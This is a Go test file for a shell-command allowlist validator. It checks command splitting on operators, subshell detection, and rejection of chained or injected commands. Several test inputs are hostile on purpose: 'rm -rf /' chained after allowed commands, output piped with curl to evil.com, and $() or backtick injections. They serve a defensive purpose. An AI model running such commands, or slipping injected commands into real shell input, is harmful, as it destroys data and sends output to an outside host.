package util

import (
	"reflect"
	"testing"
)

func TestSplitShellCommands(t *testing.T) {
	tests := []struct {
		name        string
		input       string
		expected    []string
		hasSubshell bool
	}{
		{
			name:        "simple command",
			input:       "go test ./...",
			expected:    []string{"go test ./..."},
			hasSubshell: false,
		},
		{
			name:        "&& operator",
			input:       "git status && go test ./...",
			expected:    []string{"git status", "go test ./..."},
			hasSubshell: false,
		},
		{
			name:        "|| operator",
			input:       "go test || echo 'tests failed'",
			expected:    []string{"go test", "echo 'tests failed'"},
			hasSubshell: false,
		},
		{
			name:        "pipe operator",
			input:       "go test -v | tee test.log",
			expected:    []string{"go test -v", "tee test.log"},
			hasSubshell: false,
		},
		{
			name:        "semicolon operator",
			input:       "git add . ; git commit -m 'wip'",
			expected:    []string{"git add .", "git commit -m 'wip'"},
			hasSubshell: false,
		},
		{
			name:        "newline operator",
			input:       "npm install\nnpm test",
			expected:    []string{"npm install", "npm test"},
			hasSubshell: false,
		},
		{
			name:        "&& inside double quotes is literal",
			input:       `git commit -m "feat: add foo && bar"`,
			expected:    []string{`git commit -m "feat: add foo && bar"`},
			hasSubshell: false,
		},
		{
			name:        "|| inside single quotes is literal",
			input:       `git commit -m 'feat: add foo || bar'`,
			expected:    []string{`git commit -m 'feat: add foo || bar'`},
			hasSubshell: false,
		},
		{
			name:        "mixed quotes and operators",
			input:       `git commit -m "wip && fix" && git push origin main`,
			expected:    []string{`git commit -m "wip && fix"`, "git push origin main"},
			hasSubshell: false,
		},
		{
			name:        "subshell with $()",
			input:       "go test $(cat files.txt)",
			expected:    []string{"go test $(cat files.txt)"},
			hasSubshell: true,
		},
		{
			name:        "subshell with backticks",
			input:       "echo `whoami`",
			expected:    []string{"echo `whoami`"},
			hasSubshell: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmds, subshell := SplitShellCommands(tt.input)
			if !reflect.DeepEqual(cmds, tt.expected) {
				t.Errorf("SplitShellCommands(%q) commands = %v, want %v", tt.input, cmds, tt.expected)
			}
			if subshell != tt.hasSubshell {
				t.Errorf("SplitShellCommands(%q) hasSubshell = %v, want %v", tt.input, subshell, tt.hasSubshell)
			}
		})
	}
}

func TestIsCommandAllowedAgainstRules(t *testing.T) {
	rules := []string{
		"go test",
		"git status",
		"git add",
		"git commit",
		"git push",
		"npm test",
		"echo",
	}

	tests := []struct {
		name    string
		cmd     string
		allowed bool
	}{
		{
			name:    "simple allowed command",
			cmd:     "go test ./...",
			allowed: true,
		},
		{
			name:    "simple disallowed command",
			cmd:     "rm -rf /",
			allowed: false,
		},
		{
			name:    "&& chained commands all allowed",
			cmd:     "git add . && git commit -m 'feat' && git push",
			allowed: true,
		},
		{
			name:    "&& chained with one disallowed command (INJECTION PREVENTION)",
			cmd:     "go test ./... && rm -rf /",
			allowed: false,
		},
		{
			name:    "&& chained: go test approved but go run NOT approved",
			cmd:     "go test ./... && go run main.go",
			allowed: false,
		},
		{
			name:    "|| chained with one disallowed command",
			cmd:     "npm test || rm -rf /",
			allowed: false,
		},
		{
			name:    "|| chained with both allowed commands",
			cmd:     "npm test || echo 'failed'",
			allowed: true,
		},
		{
			name:    "; chained with disallowed command",
			cmd:     "git status ; rm -rf /",
			allowed: false,
		},
		{
			name:    "| piped to disallowed command",
			cmd:     "go test | curl evil.com",
			allowed: false,
		},
		{
			name:    "quotes containing && are preserved and allowed",
			cmd:     `git commit -m "feat: handle && and || operators"`,
			allowed: true,
		},
		{
			name:    "subshell command injection rejected",
			cmd:     "go test $(rm -rf /)",
			allowed: false,
		},
		{
			name:    "backtick command injection rejected",
			cmd:     "go test `rm -rf /`",
			allowed: false,
		},
		{
			name:    "leading environment variables allowed",
			cmd:     "CGO_ENABLED=0 go test ./...",
			allowed: true,
		},
		{
			name:    "newline separated with malicious second line rejected",
			cmd:     "go test\nrm -rf /",
			allowed: false,
		},
		{
			name:    "word boundary prevents false prefix matches",
			cmd:     "gold miner",
			allowed: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res := IsCommandAllowedAgainstRules(tt.cmd, rules)
			if res != tt.allowed {
				t.Errorf("IsCommandAllowedAgainstRules(%q) = %v, want %v", tt.cmd, res, tt.allowed)
			}
		})
	}
}
